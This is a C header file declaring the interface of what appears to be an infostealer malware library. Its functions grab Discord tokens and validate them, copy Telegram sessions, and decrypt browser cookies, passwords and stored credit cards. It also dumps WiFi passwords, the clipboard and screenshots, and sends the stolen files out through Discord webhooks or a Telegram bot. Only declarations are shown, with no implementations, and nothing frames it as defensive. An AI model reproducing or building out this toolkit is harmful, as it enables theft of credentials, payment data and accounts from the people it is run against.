#pragma once

#ifdef __cplusplus
extern "C" {
#endif

// ── Discord ───────────────────────────────────────────────────────────────────
// Extracts all Discord tokens (standard + MFA) from leveldb paths.
// out_buf  : caller-allocated buffer, tokens separated by '\n'
// Returns  : number of unique tokens found (0 on failure)
int zed_discord_grab_tokens(char* out_buf, int buf_size);

// Validates a single token against the Discord API.
// Returns 1 if valid (HTTP 200), 0 otherwise.
int zed_discord_check_token(const char* token);

// ── Telegram ──────────────────────────────────────────────────────────────────
// Copies the Telegram tdata folder to dest_dir.
// Returns 1 on success, 0 on failure.
int zed_telegram_grab_sessions(const char* dest_dir);

// ── Browsers ──────────────────────────────────────────────────────────────────
// All browser functions accept browser = "all" | "chrome" | "edge" | "brave" |
// "opera" | "firefox". Results are returned as JSON arrays.

// Decrypts and dumps cookies (DPAPI + AES-256-GCM for Chromium).
// Returns number of cookies exported.
int zed_browser_dump_cookies(const char* browser, char* out_json, int buf_size);

// Decrypts and dumps saved passwords.
// Returns number of credentials exported.
int zed_browser_dump_passwords(const char* browser, char* out_json, int buf_size);

// Dumps credit card data from Web Data DB.
// Returns number of cards exported.
int zed_browser_dump_cards(const char* browser, char* out_json, int buf_size);

// Dumps browsing history.
// Returns number of entries exported.
int zed_browser_dump_history(const char* browser, char* out_json, int buf_size);

// ── System ────────────────────────────────────────────────────────────────────
// Collects OS, hardware info as JSON.
// Returns 1 on success.
int zed_system_collect_info(char* out_json, int buf_size);

// Takes a full-screen screenshot and saves to out_path as BMP.
// Returns 1 on success.
int zed_system_screenshot(const char* out_path);

// Reads clipboard text content.
// Returns length of content written.
int zed_system_clipboard(char* out_buf, int buf_size);

// Enumerates saved WiFi profiles and their passwords via WlanAPI.
// Returns JSON array of {ssid, password} objects.
int zed_system_wifi_passwords(char* out_json, int buf_size);

// Gets GPU adapter name from registry.
// Returns 1 on success.
int zed_system_get_gpu(char* out_buf, int buf_size);

// Lists installed programs from Uninstall registry key.
// Returns JSON array of {name, version, publisher} objects.
int zed_system_installed_apps(char* out_json, int buf_size);

// Lists registry Run key startup entries.
// Returns JSON array of {name, command} objects.
int zed_system_startup_items(char* out_json, int buf_size);

// ── Network ───────────────────────────────────────────────────────────────────
// Gets public IP, country, ISP, city, region via ip-api.com (HTTP GET).
// Returns JSON with {ip, country, isp, city, region, timezone}.
int zed_network_get_geo(char* out_json, int buf_size);

// ── Delivery ──────────────────────────────────────────────────────────────────
// Sends a file to a Discord webhook via multipart POST.
// Returns HTTP status code (200/204 = success).
int zed_deliver_discord(const char* webhook_url, const char* file_path, const char* message);

// Sends a file via Telegram Bot API sendDocument.
// Returns HTTP status code.
int zed_deliver_telegram(const char* bot_token, const char* chat_id,
                         const char* file_path, const char* caption);

#ifdef __cplusplus
}
#endif
